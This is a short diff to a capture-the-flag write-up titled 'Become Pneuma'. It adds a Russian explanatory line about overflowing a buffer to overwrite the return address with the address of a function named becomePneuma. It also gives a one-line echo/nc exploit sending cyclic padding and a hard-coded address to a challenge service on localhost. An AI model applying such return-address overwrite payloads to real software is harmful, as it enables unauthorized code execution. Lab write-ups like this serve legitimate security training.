@@ -8,6 +8,8 @@ Become Pneuma
 
 ## Writeup
 
+Переполняем буфер, перетираем адрес возврата адресом функции becomePneuma. Profit!
+
 `echo -e "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaRBPRBPRB\xFD\x12\x40\x00\x00\x00\x00\x00" | nc localhost 9003`
 
 ## Flag
